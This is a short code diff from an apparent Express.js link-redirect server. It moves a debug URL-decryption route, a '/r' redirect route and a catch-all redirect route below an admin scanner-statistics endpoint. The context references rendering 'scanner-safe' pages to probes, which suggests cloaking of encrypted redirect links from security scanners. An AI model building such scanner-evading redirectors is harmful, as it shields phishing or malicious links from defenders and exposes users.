@@ -1340,32 +1340,6 @@ app.head("/e/:data(*)", (req, res) => {
   return renderScannerSafePage(res, nextEnc, "HEAD-probe");
 });
 /* ===================================================================================== */
-
-/* === DEBUG decrypt — place BEFORE /r and BEFORE '/:data(*)' =============== */
-app.get("/__debug/decrypt", requireAdmin, (req, res) => {
-  const d = String(req.query.d || "");
-  const out = tryDecryptAny(d);
-  if (out && out.url) return res.status(200).type("text/plain").send(out.url);
-  const bf = bruteSplitDecryptFull(d);
-  if (bf && bf.url) return res.status(200).type("text/plain").send(bf.url);
-  const tried = (out && out.tried) ? out.tried.join("|") : "none";
-  return res.status(200).type("text/plain").send("fail; tried=" + tried);
-});
-
-/* ================== /r route — accepts full combined base in d ============ */
-app.get("/r", async (req, res) => {
-  const baseString = safeDecode(String(req.query.d || ""));
-  if (!baseString) return res.status(400).send("Missing data");
-  return handleRedirectCore(req, res, baseString);
-});
-
-/* ================== Legacy main route — direct path links ================= */
-app.get("/:data(*)", async (req, res) => {
-  const urlPathFull = (req.originalUrl || "").slice(1);
-  const cleanPath = urlPathFull.split("?")[0];
-  return handleRedirectCore(req, res, cleanPath);
-});
-
 /* ================== Admin scanner stats endpoint (inserted) ============== */
 app.get(
   "/admin/scanner-stats",
@@ -1390,6 +1364,30 @@ app.get(
 );
 
 /* ======================================================================== */
+/* === DEBUG decrypt — place BEFORE /r and BEFORE '/:data(*)' =============== */
+app.get("/__debug/decrypt", requireAdmin, (req, res) => {
+  const d = String(req.query.d || "");
+  const out = tryDecryptAny(d);
+  if (out && out.url) return res.status(200).type("text/plain").send(out.url);
+  const bf = bruteSplitDecryptFull(d);
+  if (bf && bf.url) return res.status(200).type("text/plain").send(bf.url);
+  const tried = (out && out.tried) ? out.tried.join("|") : "none";
+  return res.status(200).type("text/plain").send("fail; tried=" + tried);
+});
+
+/* ================== /r route — accepts full combined base in d ============ */
+app.get("/r", async (req, res) => {
+  const baseString = safeDecode(String(req.query.d || ""));
+  if (!baseString) return res.status(400).send("Missing data");
+  return handleRedirectCore(req, res, baseString);
+});
+
+/* ================== Legacy main route — direct path links ================= */
+app.get("/:data(*)", async (req, res) => {
+  const urlPathFull = (req.originalUrl || "").slice(1);
+  const cleanPath = urlPathFull.split("?")[0];
+  return handleRedirectCore(req, res, cleanPath);
+});
 
 /* ================== Startup summary ====================================== */
 function startupSummary() {
